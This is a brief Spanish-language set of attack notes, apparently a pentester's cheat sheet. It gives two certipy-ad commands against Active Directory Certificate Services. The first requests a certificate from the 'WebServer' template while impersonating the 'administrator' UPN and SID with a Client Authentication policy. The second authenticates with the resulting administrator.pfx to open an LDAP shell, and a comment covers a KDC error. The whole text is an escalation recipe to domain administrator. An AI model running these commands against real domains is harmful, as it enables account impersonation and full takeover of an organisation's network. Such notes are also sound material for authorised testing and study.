Solicitar Certificado

certipy-ad req -u '<attacker>@<domain>' -p '<password>' -dc-ip '<dc_ip>' -target '<hostname>.<domain>' -ca '<ca_name>' -template 'WebServer' -upn 'administrator@<domain>' -sid <SID>  -application-policies 'Client Authentication'

Autenticarnos Vía LDAP-Shell

certipy-ad auth -pfx 'administrator.pfx' -dc-ip '<dc_ip>' -ldap-shell
# Error -> KDC_ERR_PADATA_TYPE_NOSUPP: Máquina Authority (acceder a LDAP shell)
